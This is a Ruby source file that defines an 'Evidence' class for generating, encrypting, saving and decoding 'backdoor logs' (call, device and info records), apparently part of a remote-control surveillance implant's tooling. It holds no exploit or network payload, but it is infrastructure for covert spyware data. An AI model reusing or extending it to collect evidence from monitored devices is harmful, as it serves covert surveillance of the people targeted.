#
# Evidence factory (backdoor logs)
#

require 'securerandom'
require 'rcs-common/crypt'
require 'rcs-common/time'
require 'rcs-common/utf16le'

# evidence types
require 'rcs-common/evidence/common'
require 'rcs-common/evidence/call'
require 'rcs-common/evidence/device'
require 'rcs-common/evidence/info'

module RCS

class Evidence
  attr_reader :size
  attr_reader :binary
  attr_reader :content
  attr_reader :name
  attr_reader :timestamp
  attr_reader :info
  attr_reader :version
  
  def self.VERSION_ID
    2008121901
  end
  
  extend Crypt
  include Crypt
  
  def delegate_from_typeid(id)
    delegate_from_typesym RCS::Common::TYPES[id]
  end
  
  def delegate_from_typesym(type)
    eval("#{type.to_s.capitalize}Evidence").new
  end
  
  def initialize(key, info = {})
    @key = key
    @info = info
    @version = Evidence.VERSION_ID
  end
  
  def generate_header
    thigh, tlow = @timestamp.to_filetime
    deviceid_utf16 = @info[:device_id].to_utf16le_binary
    userid_utf16 = @info[:user_id].to_utf16le_binary
    sourceid_utf16 = @info[:source_id].to_utf16le_binary
    
    tid = @delegate.type_id
    additional_size = @delegate.additional_header.size
    struct = [Evidence.VERSION_ID, tid, thigh, tlow, deviceid_utf16.size, userid_utf16.size, sourceid_utf16.size, additional_size]
    header = struct.pack("I*")

    header += deviceid_utf16
    header += userid_utf16
    header += sourceid_utf16
    header += @delegate.additional_header
    
    return encrypt(header)
  end
  
  def align_to_block_len(len)
    rest = len % 16
    len += (16 - rest % 16) unless rest == 0
    len
  end
  
  def encrypt(data)
    rest = align_to_block_len(data.size) - data.size
    data += "a" * rest
    return aes_encrypt(data, @key, PAD_NOPAD)
  end

  def decrypt(data)
    return aes_decrypt(data, @key, PAD_NOPAD)
  end
  
  def append_data(data, len = data.size)
    [len].pack("I") + data
  end
  
  # factory to create a random evidence
  def generate(type)
    @name =  SecureRandom.hex(16)
    @timestamp = Time.now.utc
    
    # create a delegate of the requested type
    @delegate = delegate_from_typesym(type)
    
    # generate header
    @binary = append_data(generate_header)
    
    # append data
    chunks = @delegate.binary
    chunks.each do | c |
      @binary += append_data( encrypt(c), c.size )
    end
    
    @content = @delegate.content
    
    return self
  end
  
  def size
    @binary.size
  end
  
  # save the file in the specified dir
  def dump_to_file(dir)
    # dump the file (using the @name) in the 'dir'
    File.open(dir + '/' + @name, "wb") do |f|
      f.write(@binary)
    end
  end
  
  # load an evidence from a file
  def load_from_file(file)
    # load the content of the file in @content
    # TODO: it could be even delayed at the first time @content is requested
    File.open(file, "rb") do |f|
      @binary = f.read
      @name = File.basename f
    end
    
    return self
  end
  
  def deserialize(data)
    @binary = data
    
    header_length = data.slice!(0..3).unpack("I").shift
    header = decrypt( data.slice!(0 .. header_length - 1) )
    
    # check that version is correct
    @info[:version] = header.slice!(0..3).unpack("I").shift
    return nil unless @version == Evidence.VERSION_ID

    # issue the delegate depending on evidence type
    type = header.slice!(0..3).unpack("I").shift
    @delegate = delegate_from_typeid(type)
    @info[:type] = RCS::Common::TYPES[type]

    high = header.slice!(0..3).unpack("I").shift
    low = header.slice!(0..3).unpack("I").shift
    @info[:timestamp] = Time.from_filetime(high, low)
    
    deviceid_size = header.slice!(0..3).unpack("I").shift
    userid_size = header.slice!(0..3).unpack("I").shift
    sourceid_size = header.slice!(0..3).unpack("I").shift
    additional_size = header.slice!(0..3).unpack("I").shift
    
    @info[:device_id] = header.slice!(0 .. deviceid_size - 1).force_encoding('UTF-16LE') unless deviceid_size == 0
    @info[:user_id] = header.slice!(0 .. userid_size - 1).force_encoding('UTF-16LE') unless userid_size == 0
    @info[:source_id] = header.slice!(0 .. sourceid_size - 1).force_encoding('UTF-16LE') unless sourceid_size == 0
    additional_data = ''
    additional_data += header.slice!(0 .. additional_size - 1) unless additional_size == 0
    
    @delegate.decode_additional_header(additional_data)
    @info.update @delegate.info
    
    # split content to chunks
    chunks = []
    while data.size != 0
      len = data.slice!(0..3).unpack("I").shift
      content = data.slice!( 0 .. align_to_block_len(len) - 1 )
      chunks += [decrypt(content).slice!( 0 .. len - 1 )]
    end
    
    begin
      @content = @delegate.decode_content(chunks)
    rescue Exception => e
      return self
    end
    
    return self
  end
  
end

end # RCS::

if __FILE__ == $0
  # TODO Generated stub
end
